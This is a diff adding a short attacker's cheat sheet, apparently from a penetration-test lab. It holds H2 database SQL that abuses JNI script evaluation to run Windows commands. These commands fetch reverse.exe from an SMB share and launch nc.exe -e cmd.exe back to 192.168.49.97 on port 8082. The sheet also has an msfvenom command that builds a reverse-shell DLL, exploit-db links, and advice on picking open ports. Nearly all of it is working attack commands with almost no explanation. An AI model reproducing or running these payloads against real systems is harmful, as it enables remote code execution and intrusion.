@@ -1,0 +1,36 @@
+-- Evaluate script
+CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c copy \\\\192.168.49.97\\tools\\reverse.exe C:\\Users\\tony\\desktop\\reverse.exe").getInputStream()).useDelimiter("\\Z").next()');
+
+-- Evaluate script
+CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval"; CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c \\\\192.168.49.97\\tools\\nc.exe -e cmd.exe 192.168.49.97 8082").getInputStream()).useDelimiter("\Z").next()');
+
+
+
+
+
+
+
+
+
+https://www.exploit-db.com/exploits/49384
+
+-- Load native library
+CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";
+CALL System_load('C:\Windows\Temp\JNIScriptEngine.dll');
+
+-- Evaluate script
+CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval"; CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c \\\\192.168.49.97\\tools\\nc.exe -e cmd.exe 192.168.49.97 8082").getInputStream()).useDelimiter("\Z").next()');
+
+can't use port 443, use port 8082 (or use ports that you know that are definitely opened on the target)
+
+
+
+
+
+
+https://www.exploit-db.com/exploits/49382
+
+msfvenom -p windows/shell_reverse_tcp -f dll -o shell123.dll LHOST=192.168.49.97 LPORT=8082
+
+$PayloadFile = "C:\Users\tony\desktop\shell123.dll"
